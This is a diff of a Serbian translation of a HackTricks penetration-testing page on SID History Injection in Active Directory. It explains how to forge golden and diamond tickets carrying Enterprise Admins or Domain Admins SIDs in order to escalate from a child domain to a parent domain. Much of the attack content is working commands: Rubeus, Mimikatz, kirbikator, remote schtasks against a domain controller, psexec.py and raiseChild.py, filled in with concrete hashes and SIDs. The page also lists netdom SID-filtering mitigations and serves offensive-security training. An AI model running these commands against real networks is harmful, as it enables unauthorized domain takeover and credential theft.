@@ -4,31 +4,31 @@
 
 ## SID History Injection Attack
 
-Fokus **SID History Injection Attack** je podrška **user migration** između domena uz obezbeđivanje kontinuiranog pristupa resursima iz prethodnog domena. To se postiže **dodavanjem prethodnog Security Identifier (SID) korisnika u SID History** njegovog novog naloga. Važno je napomenuti da se ovaj proces može zloupotrebiti za dobijanje neovlašćenog pristupa dodavanjem SID-a grupe sa visokim privilegijama (kao što su Enterprise Admins ili Domain Admins) iz nadređenog domena u SID History. Ova zloupotreba omogućava pristup svim resursima u nadređenom domenu.<sup>[[1]](#references)[[2]](#references)</sup>
+Fokus **SID History Injection Attack** je pomaganje pri **migraciji korisnika između domena**, uz obezbeđivanje nastavka pristupa resursima iz prethodnog domena. Ovo se postiže **dodavanjem prethodnog Security Identifier-a (SID) korisnika u SID History** njegovog novog naloga. Važno je napomenuti da se ovaj proces može zloupotrebiti za dobijanje neovlašćenog pristupa dodavanjem SID-a grupe sa visokim privilegijama (kao što su Enterprise Admins ili Domain Admins) iz nadređenog domena u SID History. Ova zloupotreba omogućava pristup svim resursima unutar nadređenog domena.<sup>[[1]](#references)[[2]](#references)</sup>
 
-Postoje dva načina za izvršavanje ovog napada: kreiranjem **Golden Ticket** ili **Diamond Ticket**.
+Postoje dva načina za izvršavanje ovog napada: kreiranjem **Golden Ticket-a** ili **Diamond Ticket-a**.
 
-Da biste utvrdili SID grupe **"Enterprise Admins"**, najpre morate pronaći SID root domena. Nakon toga, SID grupe Enterprise Admins može se konstruisati dodavanjem `-519` na SID root domena. Na primer, ako je SID root domena `S-1-5-21-280534878-1496970234-700767426`, rezultujući SID grupe "Enterprise Admins" bio bi `S-1-5-21-280534878-1496970234-700767426-519`.<sup>[[1]](#references)</sup>
+Da biste utvrdili SID grupe **"Enterprise Admins"**, prvo morate pronaći SID root domena. Nakon njegovog pronalaženja, SID grupe Enterprise Admins može se konstruisati dodavanjem `-519` na SID root domena. Na primer, ako je SID root domena `S-1-5-21-280534878-1496970234-700767426`, rezultujući SID grupe "Enterprise Admins" bio bi `S-1-5-21-280534878-1496970234-700767426-519`.<sup>[[1]](#references)</sup>
 
 Možete koristiti i grupe **Domain Admins**, čiji se SID završava sa **512**.
 
-Drugi način za pronalaženje SID-a grupe iz drugog domena (na primer, "Domain Admins") jeste:
+Drugi način da pronađete SID grupe iz drugog domena (na primer, "Domain Admins") jeste:
 ```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
 > [!WARNING]
-> Imajte na umu da je moguće onemogućiti SID history u trust relationship-u, zbog čega će ovaj napad biti neuspešan.
+> Imajte na umu da je moguće onemogućiti SID history u trust relationship-u, zbog čega ovaj napad neće uspeti.
 
-Prema [**docs**](https://technet.microsoft.com/library/cc835085.aspx):<sup>[[3]](#references)</sup>
-- **Onemogućavanje SIDHistory na forest trust-ovima** pomoću netdom alata (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
+Prema [**dokumentaciji**](https://technet.microsoft.com/library/cc835085.aspx):<sup>[[3]](#references)</sup>
+- **Onemogućavanje SIDHistory-a na forest trust-ovima** pomoću netdom alata (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
 - **Primena SID Filter Quarantining-a na external trust-ove** pomoću netdom alata (`netdom trust /domain: /quarantine:yes on the domain controller`)
-- **Primena SID Filtering-a na domain trust-ove unutar jednog forest-a** nije preporučljiva, jer predstavlja nepodržanu konfiguraciju i može izazvati breaking changes. Ako je neki domain unutar forest-a nepouzdan, ne bi trebalo da bude član tog forest-a. U toj situaciji je najpre potrebno razdvojiti trusted i untrusted domain-e u zasebne forest-e, gde se SID Filtering može primeniti na interforest trust
+- **Primena SID Filtering-a na domain trust-ove unutar jednog forest-a** nije preporučljiva, jer je to nepodržana konfiguracija i može izazvati breaking changes. Ako je domain unutar forest-a nepouzdan, ne bi trebalo da bude njegov član. U toj situaciji je najpre potrebno razdvojiti trusted i untrusted domain-e u zasebne forest-e, gde se SID Filtering može primeniti na interforest trust
 
-Pogledajte ovaj post za više informacija o zaobilaženju ovoga: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
+Pogledajte ovaj post za više informacija o bypass-u ovoga: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)<sup>[[4]](#references)</sup>
 
 ### Diamond Ticket (Rubeus + KRBTGT-AES256)
 
-Kada sam poslednji put ovo pokušao, bilo je potrebno da dodam argument **`/ldap`**.
+Kada sam ovo poslednji put pokušao, bilo je potrebno da dodam argument **`/ldap`**.
 ```bash
 # Use the /sids param
 Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap
@@ -80,7 +80,7 @@ diamond-ticket.md
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-Eskalirajte do DA root domena ili Enterprise admin naloga koristeći KRBTGT hash kompromitovanog domena:
+Eskalirajte do DA root domena ili Enterprise admina koristeći KRBTGT hash kompromitovanog domena:
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
@@ -92,7 +92,7 @@ schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTE
 
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
 ```
-Sa stečenim permissions iz napada možete, na primer, izvršiti DCSync attack u novom domainu:
+Sa stečenim dozvolama iz napada možete, na primer, izvršiti DCSync attack u novom domenu:
 
 
 {{#ref}}
@@ -121,28 +121,29 @@ export KRB5CCNAME=hacker.ccache
 # psexec in domain controller of root
 psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
 ```
-#### Automatski uz pomoć [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
+#### Automatski pomoću [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
-Ovo je Impacket skripta koja će **automatizovati eskalaciju sa child domena na parent domen**. Skripti su potrebni:
+Ovo je Impacket skripta koja će **automatizovati eskalaciju iz child u parent domen**. Skripta zahteva:
 
 - Ciljni kontroler domena
-- Kredencijali administratorskog korisnika u child domenu
+- Creds za admin korisnika u child domenu
 
 Tok je sledeći:
 
-- Dobavlja SID grupe Enterprise Admins parent domena
-- Preuzima hash KRBTGT naloga u child domenu
+- Dobavlja SID grupe Enterprise Admins iz parent domena
+- Preuzima hash za KRBTGT nalog u child domenu
 - Kreira Golden Ticket
 - Prijavljuje se na parent domen
-- Preuzima kredencijale Administrator naloga u parent domenu
-- Ako je naveden `target-exec` switch, autentifikuje se na kontroler domena parent domena putem Psexec-a.
+- Preuzima credentials za Administrator nalog u parent domenu
+- Ako je naveden `target-exec` switch, autentifikuje se na Domain Controller parent domena pomoću Psexec-a.
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
 ## Reference
 
-- [1] [Sneaky Active Directory Persistence #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
+- [1] [Prikrivena postojanost u Active Directory-ju #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
 - [2] [Šta je Security Identifier (SID)? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
 - [3] [Bezbednosna razmatranja za trustove - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
+- [4] [itm8.com - Sid Filter kao bezbednosna granica između domena, 4. deo](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
 
 {{#include ../../banners/hacktricks-training.md}}
